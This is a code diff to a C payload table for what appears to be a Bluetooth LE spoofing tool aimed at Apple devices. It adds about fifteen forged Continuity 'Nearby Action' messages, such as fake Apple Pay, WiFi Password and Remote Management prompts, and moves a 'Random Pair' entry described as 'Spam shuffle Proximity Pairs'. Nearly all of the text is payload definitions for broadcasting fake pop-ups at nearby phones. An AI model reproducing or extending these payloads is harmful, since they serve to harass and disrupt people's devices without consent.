@@ -55,6 +55,126 @@ static Payload payloads[] = {
                      .type = ContinuityTypeTetheringSource,
                      .data = {.tethering_source = {}},
                  }},
+    {.title = "Mobile Backup",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x04}},
+         }},
+    {.title = "Watch Setup",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x05}},
+         }},
+    {.title = "Internet Relay",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x07}},
+         }},
+    {.title = "WiFi Password",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x08}},
+         }},
+    {.title = "Repair",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0A}},
+         }},
+    {.title = "Apple Pay",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0C}},
+         }},
+    {.title = "Developer Tools Pairing Request",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0E}},
+         }},
+    {.title = "Answered Call",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0F}},
+         }},
+    {.title = "Ended Call",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x10}},
+         }},
+    {.title = "DD Ping",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x11}},
+         }},
+    {.title = "DD Pong",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x12}},
+         }},
+    {.title = "Companion Link Proximity",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x14}},
+         }},
+    {.title = "Remote Management",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x15}},
+         }},
+    {.title = "Remote Auto Fill Pong",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x16}},
+         }},
+    {.title = "Remote Display",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x17}},
+         }},
 #endif
     {.title = "Random Action",
      .text = "Spam shuffle Nearby Actions",
@@ -63,6 +183,14 @@ static Payload payloads[] = {
          {
              .type = ContinuityTypeNearbyAction,
              .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
+         }},
+    {.title = "Random Pair",
+     .text = "Spam shuffle Proximity Pairs",
+     .random = true,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
          }},
     {.title = "AppleTV AutoFill",
      .text = "Banner, unlocked, long range",
@@ -135,14 +263,6 @@ static Payload payloads[] = {
          {
              .type = ContinuityTypeNearbyAction,
              .data = {.nearby_action = {.flags = 0xC0, .type = 0x0B}},
-         }},
-    {.title = "Random Pair",
-     .text = "Spam shuffle Proximity Pairs",
-     .random = true,
-     .msg =
-         {
-             .type = ContinuityTypeProximityPair,
-             .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
          }},
     {.title = "AirPods Pro",
      .text = "Modal, spammy (auto close)",
